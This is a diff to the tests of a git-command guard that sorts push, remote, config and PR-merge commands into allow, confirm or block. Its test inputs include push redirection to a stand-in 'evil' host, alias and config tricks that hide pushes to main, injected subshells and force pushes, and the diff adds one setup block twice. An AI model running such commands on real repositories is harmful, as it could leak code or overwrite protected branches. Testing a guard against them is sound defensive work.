@@ -2,7 +2,7 @@ import assert from "node:assert/strict";
 import { spawnSync } from "node:child_process";
 import { mkdirSync, mkdtempSync } from "node:fs";
 import { tmpdir } from "node:os";
-import { join } from "node:path";
+import { dirname, join } from "node:path";
 import test from "node:test";
 import { checkCommand, checkPath, type GuardConfig } from "../extensions/lib/patterns.ts";
 
@@ -108,6 +108,16 @@ test("paths: CI and release pipeline edits need confirmation", () => {
 	}
 });
 
+// Isolate git from the machine's own config (the guard's git calls inherit this process's environment).
+process.env.HOME = mkdtempSync(join(tmpdir(), "home-"));
+process.env.XDG_CONFIG_HOME = join(process.env.HOME, ".config");
+process.env.GIT_CONFIG_NOSYSTEM = "1";
+
+// Isolate git from the machine's own config (the guard's git calls inherit this process's environment).
+process.env.HOME = mkdtempSync(join(tmpdir(), "home-"));
+process.env.XDG_CONFIG_HOME = join(process.env.HOME, ".config");
+process.env.GIT_CONFIG_NOSYSTEM = "1";
+
 function sh(cwd: string, ...args: string[]) {
 	const r = spawnSync("git", args, { cwd, encoding: "utf8" });
 	assert.equal(r.status, 0, r.stderr);
@@ -133,97 +143,181 @@ function pushRepo(withOriginHead = true) {
 	return repo;
 }
 
+const ask = (cmd: string, dir: string, env: NodeJS.ProcessEnv = process.env) => checkCommand(cmd, "/elsewhere", none, dir, env).action;
+
 test("pushing the own work branch to a configured remote asks nothing", () => {
 	const repo = pushRepo();
 	for (const cmd of [
 		"git push",
 		"git push -u origin feat/x",
 		"git push origin HEAD",
+		"git push origin @",
+		"git push origin feat/x",
 		"git push origin feat/x:feat/x",
+		"git push origin HEAD:feat/x",
+		"git push origin @:feat/x",
+		"git push origin refs/heads/feat/x",
+		"git push origin HEAD:refs/heads/feat/x",
 		"git push origin feat/x:refs/heads/feat/x",
 		"git push --set-upstream origin feat/x",
 		"git push -n origin feat/x",
+		"git push --dry-run --porcelain -q -v",
 		`git -C ${repo} push origin feat/x`,
 	]) {
-		assert.equal(checkCommand(cmd, "/elsewhere", none, repo).action, "allow", cmd);
+		assert.equal(ask(cmd, repo), "allow", cmd);
 	}
+	assert.equal(checkCommand("git -C repo push", "/elsewhere", none, dirname(repo)).action, "allow", "-C relative to the command's dir");
 });
 
-test("a push that reaches the base, a tag, a delete or an unknown place still asks", () => {
+test("a push that reaches the base, another branch, a tag, a delete or an unknown place still asks", () => {
 	const repo = pushRepo();
 	for (const cmd of [
 		"git push origin main",
 		"git push origin HEAD:main",
+		"git push origin feat/x:heads/main",
 		"git push origin feat/x:refs/heads/main",
+		"git push origin feat/x:notes/x",
+		"git push origin feat/x:release/2.0",
+		"git push origin develop",
 		"git push origin feat/x main",
 		"git push --all",
 		"git push --tags",
 		"git push --follow-tags",
 		"git push --branches",
 		"git push --prune origin",
+		"git push --atomic origin feat/x",
 		"git push --delete origin feat/x",
 		"git push -d origin feat/x",
+		"git push -ud origin feat/x",
+		"git push -uq origin feat/x",
 		"git push origin :feat/x",
 		"git push -o ci.skip origin feat/x",
-		"git push --push-option=x origin feat/x",
-		"git push --repo=origin",
-		"git push --receive-pack=x origin feat/x",
-		"git push --exec=x origin feat/x",
+		"git push --push-option x origin feat/x",
+		"git push --repo origin",
+		"git push --receive-pack x origin feat/x",
 		"git push --force-with-lease origin feat/x",
 		"git push --force-if-includes origin feat/x",
+		"git push -- origin feat/x",
+		"git push origin a:b:c",
 		"git push https://example.com/r.git feat/x",
 		"git push /tmp/other.git feat/x",
 		"git push nope feat/x",
 		"git push origin v1.0",
 		"git push origin 'feat/*'",
+		"git push origin feat/x extra",
+		// C1: an alias or option hides the verb from a token parser
+		"git -c alias.x=push x origin main",
 		"git -c remote.origin.push=refs/heads/*:refs/heads/main push origin feat/x",
 		"git --git-dir=x push origin feat/x",
-		"git push origin feat/x $(echo main)",
+		// C3: earlier steps change the branch, config or directory
+		"git checkout -B main && git push origin HEAD",
+		"git config push.default matching; git push",
+		"{ cd ..; } && git push",
+		"builtin cd .. && git push",
 		"cd .. && git push origin feat/x",
-		"env FOO=1 git push origin feat/x",
+		"export GIT_DIR=/x; git push",
+		"GIT_DIR=/x git push",
+		"git push origin feat/x $(echo main)",
+		"git push origin feat/x | cat",
+		"env X=1 git push origin feat/x",
+		"sudo git push",
 	]) {
-		assert.equal(checkCommand(cmd, "/elsewhere", none, repo).action, "confirm", cmd);
+		assert.equal(ask(cmd, repo), "confirm", cmd);
 	}
 	for (const cmd of ["git push --force origin feat/x", "git push -f", "git push origin +feat/x", "git push --mirror"]) {
-		assert.equal(checkCommand(cmd, "/elsewhere", none, repo).action, "block", cmd);
+		assert.equal(ask(cmd, repo), "block", cmd);
 	}
+});
+
+test("a hook environment that redirects git makes the push ask", () => {
+	const repo = pushRepo();
+	for (const name of ["GIT_DIR", "GIT_WORK_TREE", "GIT_CONFIG", "GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM", "GIT_CONFIG_COUNT", "GIT_CONFIG_PARAMETERS", "GIT_SSH_COMMAND"]) {
+		assert.equal(ask("git push", repo, { [name]: "x" }), "confirm", name);
+	}
+	assert.equal(ask("git push", repo, {}), "allow");
 });
 
 test("a push on the base, detached, or from a non-repository asks", () => {
 	const repo = pushRepo();
 	sh(repo, "switch", "-q", "main");
-	assert.equal(checkCommand("git push", repo, none).action, "confirm", "on main");
-	assert.equal(checkCommand("git push origin HEAD", repo, none).action, "confirm", "HEAD is main");
+	assert.equal(ask("git push", repo), "confirm", "on main");
+	assert.equal(ask("git push origin HEAD", repo), "confirm", "HEAD is main");
 	sh(repo, "switch", "-q", "--detach");
-	assert.equal(checkCommand("git push", repo, none).action, "confirm", "detached");
-	assert.equal(checkCommand("git push origin HEAD", repo, none).action, "confirm", "detached HEAD");
-	assert.equal(checkCommand("git push", mkdtempSync(join(tmpdir(), "nogit-")), none).action, "confirm", "not a repository");
+	assert.equal(ask("git push", repo), "confirm", "detached");
+	assert.equal(ask("git push origin HEAD", repo), "confirm", "detached HEAD");
+	assert.equal(ask("git push", mkdtempSync(join(tmpdir(), "nogit-"))), "confirm", "not a repository");
 });
 
-test("push config that redirects the push asks", () => {
+test("push config that redirects or enlarges the push asks", () => {
 	const repo = pushRepo();
-	sh(repo, "config", "push.default", "upstream");
-	assert.equal(checkCommand("git push", repo, none).action, "confirm", "push.default=upstream");
+	const cases: Array<[string[], string]> = [
+		[["push.default", "upstream"], "push.default=upstream"],
+		[["push.default", "matching"], "push.default=matching"],
+		[["remote.origin.push", "refs/heads/*:refs/heads/main"], "remote.origin.push"],
+		[["remote.origin.mirror", "true"], "remote.origin.mirror"],
+		[["remote.origin.receivepack", "x"], "remote.origin.receivepack"],
+		[["push.followTags", "true"], "push.followTags"],
+		[["push.pushOption", "ci.skip"], "push.pushOption"],
+		[["push.recurseSubmodules", "on-demand"], "push.recurseSubmodules"],
+		[["url.https://evil/.insteadOf", "https://good/"], "url insteadOf"],
+		[["url.https://evil/.pushInsteadOf", "https://good/"], "url pushInsteadOf"],
+	];
+	for (const [[key, value], what] of cases) {
+		sh(repo, "config", key!, value!);
+		assert.equal(ask("git push origin feat/x", repo), "confirm", what);
+		sh(repo, "config", "--unset", key!);
+		assert.equal(ask("git push origin feat/x", repo), "allow", `${what} removed`);
+	}
 	sh(repo, "config", "push.default", "simple");
-	assert.equal(checkCommand("git push", repo, none).action, "allow");
-	sh(repo, "config", "remote.origin.push", "refs/heads/*:refs/heads/main");
-	assert.equal(checkCommand("git push origin feat/x", repo, none).action, "confirm", "remote.origin.push");
-	sh(repo, "config", "--unset", "remote.origin.push");
+	sh(repo, "config", "push.followTags", "false");
+	assert.equal(ask("git push", repo), "allow", "benign values");
+});
+
+test("the remote of a bare push follows git's precedence and must be configured", () => {
+	const repo = pushRepo();
+	sh(repo, "remote", "add", "other", "/tmp/other.git");
+	sh(repo, "config", "branch.feat/x.remote", "other");
+	assert.equal(ask("git push", repo), "allow", "branch.<b>.remote");
+	sh(repo, "config", "remote.pushDefault", "nowhere");
+	assert.equal(ask("git push", repo), "confirm", "remote.pushDefault beats branch.remote and is not configured");
+	assert.equal(ask("git push origin feat/x", repo), "allow", "an explicit remote ignores pushDefault");
+	sh(repo, "config", "remote.pushDefault", "origin");
 	sh(repo, "config", "branch.feat/x.pushRemote", "nowhere");
-	assert.equal(checkCommand("git push", repo, none).action, "confirm", "push remote is not a configured remote");
+	assert.equal(ask("git push", repo), "confirm", "branch.<b>.pushRemote beats pushDefault");
 });
 
 test("a repository without origin/HEAD uses a local main as the base; with neither it asks", () => {
 	const repo = pushRepo(false);
-	assert.equal(checkCommand("git push origin feat/x", repo, none).action, "allow");
-	assert.equal(checkCommand("git push origin main", repo, none).action, "confirm");
+	assert.equal(ask("git push origin feat/x", repo), "allow");
+	assert.equal(ask("git push origin main", repo), "confirm");
 	sh(repo, "branch", "-m", "main", "trunk");
 	sh(repo, "update-ref", "-d", "refs/remotes/origin/HEAD");
-	assert.equal(checkCommand("git push origin feat/x", repo, none).action, "confirm", "unknown base");
+	assert.equal(ask("git push origin feat/x", repo), "confirm", "unknown base");
 });
 
-test("merging a PR or MR asks", () => {
-	assert.equal(action("gh pr merge 12 --squash"), "confirm");
-	assert.equal(action("glab mr merge 12"), "confirm");
+test("changing where or what git pushes asks, from any position", () => {
+	for (const cmd of [
+		"git remote add x https://evil/r.git",
+		"git remote add x https://evil/r.git && git push x feat/x",
+		"git -C sub remote set-url origin https://evil/r.git",
+		"git remote rename origin up",
+		"git config remote.origin.url https://evil/r.git",
+		"git config --global url.https://evil/.insteadOf https://good/",
+		"git config push.default matching",
+		"git config branch.main.remote x",
+		"git config alias.p push",
+	]) {
+		assert.equal(action(cmd), "confirm", cmd);
+	}
+	for (const cmd of ["git remote -v", "git remote get-url origin", "git config --get remote.origin.url", "git config --list", "git config user.name x"]) {
+		assert.equal(action(cmd), "allow", cmd);
+	}
+});
+
+test("merging a PR or MR asks, with options anywhere", () => {
+	for (const cmd of ["gh pr merge 12 --squash", "glab mr merge 12", "gh -R o/r pr merge 1", "gh --repo o/r pr merge 1", "glab -R o/r mr merge 3"]) {
+		assert.equal(action(cmd), "confirm", cmd);
+	}
 	assert.equal(action("gh pr create --fill"), "allow");
+	assert.equal(action("gh pr view 12"), "allow");
 });
